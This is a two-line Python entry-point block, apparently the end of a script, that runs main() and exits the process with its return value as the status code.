if __name__ == "__main__":
    raise SystemExit(main())
